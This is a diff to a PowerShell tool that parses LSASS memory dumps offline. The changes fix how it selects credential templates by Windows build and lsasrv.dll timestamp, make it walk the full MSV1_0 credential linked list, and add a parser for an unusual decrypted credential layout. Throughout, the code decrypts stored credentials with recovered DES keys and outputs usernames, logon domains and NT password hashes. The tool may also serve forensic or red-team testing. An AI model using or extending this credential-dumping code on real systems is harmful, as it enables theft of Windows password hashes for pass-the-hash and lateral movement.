@@ -1322,7 +1322,7 @@ $Start = Get-Date
                 $Pattern = "33FF4189374C8BF34585C074"
                 $offset_to_FirstEntry = 16
                 $offset_to_SessionCounter = -4
-                if($LSATimestamp -gt "139722752")
+                if($LSATimestamp -gt "1397227520")
                     {
                     $ParsingFunction = "Get-MSV1_0_LIST_63"
                     }
@@ -1337,16 +1337,9 @@ $Start = Get-Date
                 Write-Debug -Message ("Identified OS Version is " + $OSVersion)
                 Write-Debug -Message ("Credential template identfied and selected")
                 $Pattern = "8BDE488D0C5B48C1E105488D05"
-                $offset_to_FirstEntry = 16
-                $offset_to_SessionCounter = -4
-                if($LSATimestamp -gt "139722752")
-                    {
-                    $ParsingFunction = "Get-MSV1_0_LIST_63"
-                    }
-                else 
-                    {
-                    $ParsingFunction = "Get-MSV1_0_LIST_62"
-                    }
+                $offset_to_FirstEntry = 36
+                $offset_to_SessionCounter = -6
+                $ParsingFunction = "Get-MSV1_0_LIST_63"
                 $CredParsingFunction = "Parse-PrimaryCredential" 
             }
         elseif(($OSVersion -le $WIN_10_1507) -or ($OSVersion -lt $WIN_10_1511))
@@ -1748,7 +1741,7 @@ $Start = Get-Date
                 $PathToDMP,
                 $Dump
             )
-        $MSV = Select-MSVTemplate -OSVersion ([convert]::toint64($Dump.SystemInfoStream.BuildNumber,16)) -OSArch $Dump.SystemInfoStream.ProcessorArchitecture -LSATimestamp ($Dump.ModuleListStream | where {$_.ModuleName -like "*lsasrv.dll*"})
+        $MSV = Select-MSVTemplate -OSVersion ([convert]::toint64($Dump.SystemInfoStream.BuildNumber,16)) -OSArch $Dump.SystemInfoStream.ProcessorArchitecture -LSATimestamp ([convert]::toint64(($Dump.ModuleListStream | where {$_.ModuleName -like "*lsasrv.dll*"}).TimeDateStamp,16))
         $PatternAddress = Find-PatternInModule -ModuleName "lsasrv.dll" -Pattern $MSV.Pattern
         if ($PatternAddress -eq $Null) {
             Write-Debug -Message ("Credential Pattern not found - Script will be terminated")
@@ -2540,7 +2533,8 @@ $Start = Get-Date
         
                     return  $MSV1_0_LIST_61
         }
-    function Get-MSV1_0_CREDENTIAL_LIST
+
+        function Get-MSV1_0_CREDENTIAL_LIST
         {
         Param(
             $InitialPosition,
@@ -2552,33 +2546,41 @@ $Start = Get-Date
             
             $PathToDMP
         )
+        
+        $MSV1_0_CREDENTIAL_LIST = @()
+        
+        $flink = $null
+
+        while(1 -gt 0)
+            {
+            if($flink -ne $Null)
+                {
+                $InitialPosition = (Get-MemoryAddress -MemoryAddress  $flink -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position 
+                }
+            $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+            $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
+            
+            $fileReader.BaseStream.Position=$InitialPosition
+            $flink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+            $AuthenticationPackageId = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
     
-        $fileStream = New-Object –TypeName System.IO.FileStream –ArgumentList ($PathToDMP, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
-        $fileReader = New-Object –TypeName System.IO.BinaryReader –ArgumentList $fileStream
+            $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null  
     
-        $MSV1_0_CREDENTIAL_LIST = New-Object -Type psobject -Property (@{
-                "flink" = $null
-                "AuthenticationPackageId"=$null
-                "PrimaryCredentials_ptr"= $null
-                "PrimaryCredentials_data" =$null
-                })
+            $PrimaryCredentials_ptr = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
+            $PrimaryCredentials_data = Get-MSV1_0_PRIMARY_CREDENTIAL_ENC -InitialPosition (Get-MemoryAddress -MemoryAddress $PrimaryCredentials_ptr -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position -StartAddress $PrimaryCredentials_ptr -DESKey $DESKey -IV $IV -Dump $Dump -PathToDMP $PathToDMP -CredentialParsingFunction $CredentialParsingFunction
     
-        $fileReader.BaseStream.Position=$InitialPosition
-        $flink = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
-        $AuthenticationPackageId = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(4))).replace('-','')
-    
-        $fileReader.BaseStream.Position=($fileReader.BaseStream.Position+(Get-Align -Position $fileReader.BaseStream.Position -Architecture $Dump.SystemInfoStream.ProcessorArchitecture -Dump $Dump)) # | Out-Null  
-    
-        $PrimaryCredentials_ptr = Convert-LitEdian -String ([System.BitConverter]::ToString($fileReader.ReadBytes(8))).replace('-','')
-        $PrimaryCredentials_data = Get-MSV1_0_PRIMARY_CREDENTIAL_ENC -InitialPosition (Get-MemoryAddress -MemoryAddress $PrimaryCredentials_ptr -MemoryRanges64 $Dump.Memory64ListStream -PathToDMP $PathToDMP).position -StartAddress $PrimaryCredentials_ptr -DESKey $DESKey -IV $IV -Dump $Dump -PathToDMP $PathToDMP -CredentialParsingFunction $CredentialParsingFunction
-    
-        $MSV1_0_CREDENTIAL_LIST = New-Object -Type psobject -Property (@{
-                "flink" = $flink
-                "AuthenticationPackageId"=$AuthenticationPackageId
-                "PrimaryCredentials_ptr"= $PrimaryCredentials_ptr
-                "PrimaryCredentials_data" = $PrimaryCredentials_data
-                })
-    
+            $MSV1_0_CREDENTIAL_LIST += New-Object -Type psobject -Property (@{
+                    "flink" = $flink
+                    "AuthenticationPackageId"=$AuthenticationPackageId
+                    "PrimaryCredentials_ptr"= $PrimaryCredentials_ptr
+                    "PrimaryCredentials_data" = $PrimaryCredentials_data
+                    })
+            $flink
+            if($flink -eq "0000000000000000")
+                {
+                break
+                }
+            }
         return $MSV1_0_CREDENTIAL_LIST
         }
     
@@ -2635,7 +2637,11 @@ $Start = Get-Date
         $encrypted_data.data = (Get-MemoryAddress -MemoryAddress $encrypted_data.Buffer -MemoryRanges64 $Dump.Memory64ListStream -SizeToRead ([convert]::toint64($encrypted_data.Length,16)) -PathToDMP $PathToDMP).data
        
         [string]$DecryptedCredsStr = Get-DecCreds -DESKey $DESKey -IV $IV -EncString $encrypted_data.data 
-        if($CredentialParsingFunction -eq "Parse-PrimaryCredential")
+        if($DecryptedCredsStr.Substring(8,8) -eq "CCCCCCCC" -and (($DecryptedCredsStr.Length / 2) -eq 96))
+            {
+            $decrypted_data = Parse-StrangeCredential -DecString $DecryptedCredsStr -Dump $Dump
+            }        
+        elseif($CredentialParsingFunction -eq "Parse-PrimaryCredential")
             {
             $decrypted_data = Parse-PrimaryCredential -DecString $DecryptedCredsStr -Dump $Dump
             }
@@ -3055,132 +3061,55 @@ $Start = Get-Date
         
         return $ParsedCreds
         }
-    <#
-    function Parse-Credentials
+    function Parse-StrangeCredential
         {
         Param(
             [string]$DecString,
             $Dump
-        )
+        )        
+        
+        $ParsedCreds = New-Object -Type psobject -Property (@{
+            "unk1" = $null # 2 Bytes USHORT
+            "unk2" = $null
+            "unk_tag" = $null # 4 Bytes 
+            "unk_remaining_size" = $null # 4 Bytes 
+            "LengthOfNTofPassword" = $null # 4 Bytes
+            "isNtOwfPassword" =$null # 16 Bytes
+            "LengthOfShaofPassword" = $null # 4 Bytes
+            "isShaOwPassword" =$null # 20 Bytes
+             })
+
+        $Position = 0
+        $unk1 = Convert-LitEdian -String ($DecString.Substring($Position,4))
+        $Position = $Position + 4 
+        $unk2 = Convert-LitEdian -String ($DecString.Substring($Position,4))
+        $Position = $Position + 4 
+        $unk_tag = Convert-LitEdian -String ($DecString.Substring($Position,8))
+        $Position = $Position + 8
+        $unk_remaining_size = Convert-LitEdian -String ($DecString.Substring($Position,8))
+        $Position = $Position + 8
+        $Position = $Position + 80
+        $LengthOfNTofPassword = Convert-LitEdian -String ($DecString.Substring($Position,8))
+        $Position = $Position + 8
+        $isNtOwfPassword = ($DecString.Substring($Position,32))
+        $Position = $Position + 32
+        $LengthOfShaofPassword = Convert-LitEdian -String ($DecString.Substring($Position,8))
+        $Position = $Position + 8
+        $isShaOwPassword = ($DecString.Substring($Position,40))
+        $Position = $Position + 40
     
         $ParsedCreds = New-Object -Type psobject -Property (@{
-                "LogonDomainName" = $null
-                "UserName" = $null
-                "pNtlmCredIsoInProc" = $null
-                "isIso" = $null
-                "isNtOwfPassword" =$null
-                "isLmOwfPassword" = $null
-                "isShaOwPassword" =$null
-                "isDPAPIProtected" =$null
-                "align0" =$null
-                "align1" = $null
-                "align2" = $null
-                "unkD" = $null
-                "isoSize" =$null
-                "DPAPIProtected" = $null
-                "align3" = $null
-                "NtOwfPassword" = $null
-                "LmOwfPassword" = $null
-                "ShaOwPassword" = $null
-                 })
-    
-    
-    
-        $LogonDomainName = New-Object -Type psobject -Property (@{
-                 "Position" = $Null
-                 "Length" =  $null # 2 Bytes
-                 "MaxLength" = $null # 2 Bytes
-                 "Buffer" = $null # 8 Bytes
-                 "Data" = $null
-                 })
-        $DecUsername = New-Object -Type psobject -Property (@{
-                 "Position" = $Null
-                 "Length" =  $null # 2 Bytes
-                 "MaxLength" = $null # 2 Bytes
-                 "Buffer" = $null # 8 Bytes
-                 "Data" = $null
-                 })
-    
-            $Position = 0
-            $LogonDomainName.Position = $Position
-            $LogonDomainName.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
-            $Position = $Position + 4 
-            $LogonDomainName.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
-            $Position = $Position + 4 
-            $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
-            
-            $LogonDomainName.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
-            $Position = $Position + 16 
-            $LogonDomainName.Data = Get-CharsFromHex -HexString ($DecString.Substring(([convert]::toint64($LogonDomainName.Buffer,16)*2),(([convert]::toint64($LogonDomainName.MaxLength,16)*2))))
-            $DecUsername.Position = $Position
-            $DecUsername.Length = Convert-LitEdian -String ($DecString.Substring($Position,4))
-            $Position = $Position + 4 
-            $DecUsername.MaxLength = Convert-LitEdian -String ($DecString.Substring($Position,4))
-            $Position = $Position + 4 
-            $Position = $Position + (2*(Get-Align -Position $Position -Architecture AMD64 -Dump $Dump -Address "000000000000"))
-            $DecUsername.Buffer = Convert-LitEdian -String ($DecString.Substring($Position,16))
-            $Position = $Position + 16
-            $DecUsername.Data = Get-CharsFromHex -HexString  ($DecString.Substring(([convert]::toint64($DecUsername.Buffer,16)*2),(([convert]::toint64($DecUsername.MaxLength,16)*2))))
-            $pNtlmCredIsoInProc = $DecString.Substring($Position,16)
-            $Position = $Position + 16
-            $isIso =  $DecString.Substring($Position,2)
-            $Position = $Position + 2
-            $isNtOwfPassword = $DecString.Substring($Position,2)
-            $Position = $Position + 2
-            $isLmOwfPassword = $DecString.Substring($Position,2)
-            $Position = $Position + 2
-            $isShaOwPassword = $DecString.Substring($Position,2)
-            $Position = $Position + 2
-            $isDPAPIProtected = $DecString.Substring($Position,2)
-            $Position = $Position + 2
-            $align0 = $DecString.Substring($Position,2)
-            $Position = $Position + 2
-            $align1 = $DecString.Substring($Position,2)
-            $Position = $Position + 2
-            $align2 = $DecString.Substring($Position,2)
-            $Position = $Position + 2
-            $unkD = $DecString.Substring($Position,8)
-            $Position = $Position + 8 
-            $isoSize = $DecString.Substring($Position,4)
-            $Position = $Position + 4
-            $DPAPIProtected = $DecString.Substring($Position,32)
-            $Position = $Position + 32
-            $align3 = $DecString.Substring($Position,8)
-            $Position = $Position + 8 
-     
-            $NtOwfPassword = $DecString.Substring($Position,32)
-            $Position = $Position + 32
-            $LmOwfPassword = $DecString.Substring($Position,32)
-            $Position = $Position + 32
-            $ShaOwPassword = $DecString.Substring($Position,32)
-            $Position = $Position + 32
-    
-    
-        $ParsedCreds = New-Object -Type psobject -Property (@{
-                "LogonDomainName" = $LogonDomainName
-                "UserName" = $DecUsername
-                "pNtlmCredIsoInProc" = $pNtlmCredIsoInProc
-                "isIso" = $isIso
-                "isNtOwfPassword" =$isNtOwfPassword
-                "isLmOwfPassword" = $isLmOwfPassword
-                "isShaOwPassword" =$isShaOwPassword
-                "isDPAPIProtected" =$isDPAPIProtected
-                "align0" =$align0
-                "align1" = $align1
-                "align2" = $align2
-                "unkD" = $unkD
-                "isoSize" =$isoSize
-                "DPAPIProtected" = $DPAPIProtected
-                "align3" = $align3
-                "NtOwfPassword" = $NtOwfPassword
-                "LmOwfPassword" = $LmOwfPassword
-                "ShaOwPassword" = $ShaOwPassword
-                 })
-            
-    
+            "unk1" = $unk1 # 2 Bytes USHORT
+            "unk2" = $unk2
+            "unk_tag" = $unk_tag # 4 Bytes 
+            "unk_remaining_size" = $unk_remaining_size # 4 Bytes 
+            "LengthOfNTofPassword" = $LengthOfNTofPassword # 4 Bytes
+            "isNtOwfPassword" =$isNtOwfPassword # 16 Bytes
+            "LengthOfShaofPassword" = $LengthOfNTofPassword # 4 Bytes
+            "isShaOwPassword" =$isShaOwPassword # 20 Bytes
+             })
         return $ParsedCreds
         }
-    #>
     Function Get-LUID
         {
         Param(
@@ -3501,6 +3430,7 @@ $Start = Get-Date
 
     foreach($Address in $CredAddresses)
         {
+        $CredentialEntry = $null
         while(1 -gt 0)
             {    
             $AddressArray = @()       
@@ -3528,7 +3458,7 @@ $Start = Get-Date
                 $CredentialEntry = Get-MSV1_0_LIST_63 -InitialPosition $CredEntryAddressInitialPosition.position -StartAddress $NEntry -DESKey $Crypto.DESKey -IV $Crypto.IV -PathToDMP $PathToDMP -Dump $Dump -CredentialParsingFunction $CredTemplate.CredParsingFunction
                 }
             $CredentialList += $CredentialEntry
-            if($CredentialEntry.flink -eq ("{0:x16}" -f ((([convert]::toint64(($CredData.MSVEntry).trim(),16) - ($CredAddresses.Count * 8))))))
+            if(($CredentialEntry.flink -eq ("{0:x16}" -f ((([convert]::toint64(($CredData.MSVEntry).trim(),16) - ($CredAddresses.Count * 4)))))) -or ($CredentialEntry.flink -eq ("{0:x16}" -f ((([convert]::toint64(($CredData.MSVEntry).trim(),16) - ($CredAddresses.Count * 8)))))))
                 {
                 break
                 }
@@ -3544,16 +3474,30 @@ $Start = Get-Date
         })
     
     Foreach($Entry in $CredentialList)
-       {
-           if($Outcome.username -notcontains $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data.Username.data)
-               {       
-               $Outcome += New-Object -Type psobject -Property (@{
-                      "Username" = $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data.Username.data
-                      "LogonDomain" =  $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data.LogonDomainName.data
-                      "NTHash" = $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data.NtOwfPassword
-                      })
-               }
-       }
+        {
+            if($Outcome.username -notcontains $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data.Username.data)
+                {
+                foreach($Value in $Entry.MSV1_0_CREDENTIAL_LIST.PrimaryCredentials_data.decrypted_data)
+                     {
+                     if($Value.unk_tag -eq "CCCCCCCC")
+                        {
+                        $Outcome += New-Object -Type psobject -Property (@{
+                               "Username" = "NULL"
+                               "LogonDomain" =  "NULL"
+                               "NTHash" = $Value.isNtOwfPassword
+                               })
+                         }
+                     else
+                         {
+                         $Outcome += New-Object -Type psobject -Property (@{
+                           "Username" = $Value.Username.data
+                           "LogonDomain" =  $Value.LogonDomainName.data
+                           "NTHash" = $Value.NtOwfPassword
+                           })
+                         } 
+                     }      
+                }
+        }
     Write-Debug -Message ("Results extracted. In summery " + $Outcome.count + " Entries could be identfied")
 
     
